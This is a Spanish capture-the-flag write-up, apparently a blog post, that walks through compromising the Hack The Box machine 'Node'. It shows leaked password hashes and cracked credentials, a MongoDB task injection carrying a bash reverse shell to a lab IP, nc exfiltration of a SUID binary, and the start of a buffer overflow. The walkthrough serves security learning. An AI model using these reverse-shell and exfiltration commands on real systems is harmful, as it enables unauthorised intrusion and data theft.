---
layout      : post
title       : "Maquina Node - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Node/node.png
category    : [ hackthebox ]
tags        : [ Information Leaked, Api Enumeration, Cracking Hashes, MongoDB Enumeration, MongoTask Injection, SUID Binary Explotation, Buffer Overflow]
---

El dia de hoy vamos a resolver `Node` de `hackthebox` una maquina `linux` de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la `api` que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de `mongodb` donde a traves de un campo obtendremos ejecución remota de comandos `rce` y finalmente mediante un binario `suid` podremos leeer la flag del usuario `root`. Ademas alternivamente vamos a ganar acceso al sistema explotando un `buffer overflow` en el binario `suid` a traves de `ret2libc` y ganando acceso al sistema como el usuario `root`. 
 
Esta maquina es divertida asi que a darle!.

Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Node
❯ ls:w

 Node
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.58
PING 10.10.10.58 (10.10.10.58) 56(84) bytes of data.
64 bytes from 10.10.10.58: icmp_seq=1 ttl=63 time=109 ms

--- 10.10.10.58 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.550/108.550/108.550/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63` y por proximidad seria correspondiente a una maquina `linux`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.58 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:25 GMT
Initiating SYN Stealth Scan at 22:25
Scanning 10.10.10.58 [65535 ports]
Discovered open port 22/tcp on 10.10.10.58
Discovered open port 3000/tcp on 10.10.10.58
Completed SYN Stealth Scan at 22:25, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.58
Host is up, received user-set (0.11s latency).
Scanned at 2023-07-17 22:25:27 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (880B)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p22,3000 10.10.10.58 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:26 GMT
Nmap scan report for 10.10.10.58
Host is up (0.12s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.44 seconds
```

Visulizamos información interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH     |   OpenSSH 7.2p2 |
| 80   | HTTP     |  hadoop-tasktracker|


## EXPLOTACION [#](#explotación) {#explotación}

Comenzamos usando `whatweb`, para determinar las tecnologias que esta usando el servicio web.

```bash
❯ whatweb http://10.10.10.58:3000
http://10.10.10.58:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.58], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

La herramienta nos reporta que se trata de un `Express`, lo que quiere decir que en el backend esta corriendo `NodeJS`.

Vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.

![](/assets/images/HTB/htb-writeup-Node/node1.PNG)

Vemos que existe una opcion de login para acceder al servicio.

![](/assets/images/HTB/htb-writeup-Node/node2.PNG)


Ahora ya que sabemos que por dentro corre un `nodejs`, para evitar aplicar fuzzing, podemos usar el depurador, para poder ver rutas por defecto del servicio tipo `app`. Y dentro descubrimos una ruta de usuarios.

![](/assets/images/HTB/htb-writeup-Node/node3.PNG)

Si tratamos de acceder a la ruta, vemos que podemos listar el contenido de usuarios con sus respectivas contraseñas hasheadas.

![](/assets/images/HTB/htb-writeup-Node/node4.PNG)


Procedemos a crackear las contraseñas para ello usaremos nuestra web de confianza.

* [https://crackstation.net/](https://crackstation.net/)


y Obtenemos contraseñas en texto claro.

![](/assets/images/HTB/htb-writeup-Node/node5.PNG)

La exportamos al fichero de nombre `users.txt` y procedemos a logearnos al servicio.

```bash
❯ cat users.txt
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
```

Al conectarnos vemos una opción de `DownloadBackup`, asi que lo descargamos y hacemos un decode del contenido que esta en `base64` y lo exportamos con el nombre de `backup`.

![](/assets/images/HTB/htb-writeup-Node/node6.PNG)


```bash
❯ cat myplace.backup | base64 -d > backup
❯ cat backup
❯ file backup
backup: Zip archive data, at least v1.0 to extract
```

Como resultado obtenemos un comprimido protegido por contraseña.

```bash
❯ unzip backup
Archive:  backup
   creating: var/www/myplace/
[backup] var/www/myplace/package-lock.json password
```

Usaremos `fcrackzip` y obtenemos la contraeña del comprimido.


```bash
❯ fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup


PASSWORD FOUND!!!!: pw == magicword
```

Dentro observamos bastante contenido, pero al tratarse de un `node.js`, podemos tratar de grepear por archivos como `app.js`, donde podemos encontrar informacion interesante.

```bash
❯ find . | grep app.js
./www/myplace/app.js
./www/myplace/static/assets/js/app/app.js
```

Abrimos el archivo `app.js` y encontramos unas credenciales del servicio mongodb, correspondientes al usuario `mark`.


![](/assets/images/HTB/htb-writeup-Node/node7.PNG)


Como vimos que el servicio `ssh` se encuentra activo, podemos tratar de conectarnos con las nuevas credenciales.

```bash
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3

              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Jul 18 00:34:52 2023 from 10.10.16.2
mark@node:~$ 
```

Ahora que ganamos acceso al sistema como el usuario `mark`, listamos los servicios activos y vemos el puerto `27017`, correspondiente a `MongoDB`.

```bash
mark@node:~$ ss -nltp
State       Recv-Q Send-Q                 Local Address:Port                    Peer Address:Port      
LISTEN      0      128                     127.0.0.1:27017                              *:*            
LISTEN      0      128                          *:22                                    *:*       
LISTEN      0      128                        :::3000                                   :::*           
```

Si ahora listamos los procesos del sistema vemos que se esta corriendo otro `app.js` correspondiente a un `scheduller`. 

```bash
mark@node:~$ ps -faux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    Jul17   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jul17   0:00  \_ [ksoftirqd/0]
mongodb   1237  0.6 11.8 281952 89772 ?        Ssl  Jul17   0:36 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1240  0.0  5.5 1008568 42148 ?       Ssl  Jul17   0:02 /usr/bin/node /var/scheduler/app.js
tom       1243  0.0  9.0 1041968 68560 ?       Ssl  Jul17   0:03 /usr/bin/node /var/www/myplace/app.js
```

Si visualizamos el archivo obtenemos otras credenciales correspondientes a mongo.

```js
mark@node:~$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

Nos conectamos la servicio con las nuevas credenciales obtenidas, listamos las colecciones de la base de datos.

```bash
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> show collections
tasks
```

En la colección `tasks`, vamos a usar `db.task.find()` tal y como vemos en el script `app.js` para realizar consultas en la colección `tasks`.

```bash
> db.tasks.find()
> 
```

La consulta no nos lista nada, pero si volvemos a revisar `app.js` obervamos `exec(doc.cmd);` que se esta validando el uso de un campo llamado `cmd`, asi que podriamos tratar de  insertar un nuevo documento con `db.tasks.insert()` incorporando el `cmd` y ejecutando un comando aprovechandonos de la función `exec`y asi otorgarnos una `revershell`.

```bash
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("64b5d7e418c6053c65dd5030"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'" }
```

Ahora nos ponemos en escucha en nuestra equipo y recibimos la conexión como el usuario `tom`.

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.58.
Ncat: Connection from 10.10.10.58:44564.
bash: cannot set terminal process group (1240): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$ whoami
whoami
tom
```

Ahora podemos dirigirnos al directorio personal del usuario y visualizar la primera flag `user.txt`.

```bash
tom@node:/$ cd /home/tom
cd /home/tom
tom@node:~$ cat user.txt
cat user.txt
4452fba153c742ca44fd79aac0f934c9
```
## ELEVACION DE PRIVILEGIOS [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Listando los binarios con privilegios `suid`, encontramos uno inusual llamando `backup`.

```bash
tom@node:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
```

Si tratamos de ejecutar el binario, vemos que no sucede nada.

```bash
tom@node:/$ /usr/local/bin/backup
/usr/local/bin/backup
tom@node:/$
```

Pero si volvemos a visualizar el `app.js` que listamos al principio el cual estaba contenido en el comprimido, observamos una ruta correspondiente a `backup` la cual se ejecuta con 3 parametros, entre ellos una key y un directorio.

![](/assets/images/HTB/htb-writeup-Node/node8.PNG)


Probamos nuevamente a ejecutarlo con 3 parametros.

```bash
om@node:/$ /usr/local/bin/backup a a a
/usr/local/bin/backup a a a



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Ah-ah-ah! You didn't say the magic word!


tom@node:/$
```

Vemos que esta vez funciona, pero ahora usaremos ltrace para ver a bajo nivel el proceso de lo que sucede al ejecutar el binario.

```bash
tom@node:/$ ltrace /usr/local/bin/backup a b c
ltrace /usr/local/bin/backup a b c
strncpy(0xffef6578, "b", 100)                                                                                     = 0xffef6578
strcpy(0xffef6561, "/")                                                                                           = 0xffef6561
strcpy(0xffef656d, "/")                                                                                           = 0xffef656d
strcpy(0xffef64f7, "/e")                                                                                          = 0xffef64f7
strcat("/e", "tc")                                                                                                = "/etc"
strcat("/etc", "/m")                                                                                              = "/etc/m"
strcat("/etc/m", "yp")                                                                                            = "/etc/myp"
strcat("/etc/myp", "la")                                                                                          = "/etc/mypla"
strcat("/etc/mypla", "ce")                                                                                        = "/etc/myplace"
strcat("/etc/myplace", "/k")                                                                                      = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey")                                                                                    = "/etc/myplace/key"
strcat("/etc/myplace/key", "s")                                                                                   = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                                                                                   = 0x8c06410
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")                                                              = 64
strcmp("b", "a01a6aa5aaf1d7729f35c8278daae30f"...)                                                                = 1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")                                                              = 64
strcmp("b", "45fac180e9eee72f4fd2d9386ea7033e"...)                                                                = 1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")                                                              = 64
strcmp("b", "3de811f4ab2b7543eaf45df611c2dd25"...)                                                                = 1
fgets("\n", 1000, 0x8c06410)                                                                                      = 0xffef610f
strcspn("\n", "\n")                                                                                               = 0
strcmp("b", "")                                                                                                   = 1
fgets(nil, 1000, 0x8c06410)                                                                                       = 0
strcpy(0xffef5148, "Ah-ah-ah! You didn't say the mag"...)                                                         = 0xffef5148
printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Ah-ah-ah! You didn't say the mag"... [!] Ah-ah-ah! You didn't say the magic word!
```

Observamos que compara el segundo campo `b` con una key de un archivo `/etc/myplace/keys` que si lo listamos podemos ver el contenido.

```bash
tom@node:/$ cat /etc/myplace/keys
cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

Podemos usar una de las keys y como tercer parametro ya que nos pide ingresar un directorio, podriamos tratar de visualizar la flag de root.

```bash
/usr/local/bin/backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving root
 [+] Finished! Encoded backup is below:

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
```

Nos devuelve un resultado en base64, y si lo decodeamos obtenemos un archivo comprimido, y al unzipearlo nos pide ingresar una contraseña.

```bash
❯ unzip file
Archive:  file
[file] root/.profile password: 
```

Podemos usar la que previamente obtuvimos con `fcrackzip` ya que se puede estar reutilizando la contraseña.


```bash
❯ unzip file
Archive:  file
[file] root/.profile password: 
  inflating: root/.profile           
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
 extracting: root/.nano/search_history  
❯ 
❯ ls
 root   file
```

Efectivamente logramos descomprimirlo usando la contraseña previa `magicword`, ahora podemos ver lo que hay dentro del directorio y encontramos la segunda flag `root.txt`.

```bash
❯ cd root
❯ ls
 root.txt
❯ cat root.txt
98ef491742abffa14a62facb8d832818
```

## EXPLOTACION ALTERNA  [#](#explotacion-alterna) {#explotacion-alterna}

Vimos anteriormente que pudimos leer la flag `root.txt`, pero no logramos obtener acceso como el usuario `root` al sistema. Anteriormente vimos que al binario `backup`, le pasabamos un parametro final correspondiente a un directorio, pero si tratamos de pasar muchos caracteres como ultimo parametro hacemos que el programa se corrompa.


```bash
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print("A"*40000)')   
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print("A"*40000)')
Segmentation fault (core dumped)
```
Vemos que se acontece un desbordamiento de buffer o `bufferoverflow`.

Vamos a traernos el binario a nuestro equipo.

```bash
tom@node:/usr/local/bin$ nc 10.10.16.2 443 < backup
nc 10.10.16.2 443 < backup
```

Para ejecutarlo sin problemas, voy a crearme un directorio y el archivo donde se almacenan las keys.

```bash
❯ mkdir /etc/myplace
❯ nvim /etc/myplace/keys
❯ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
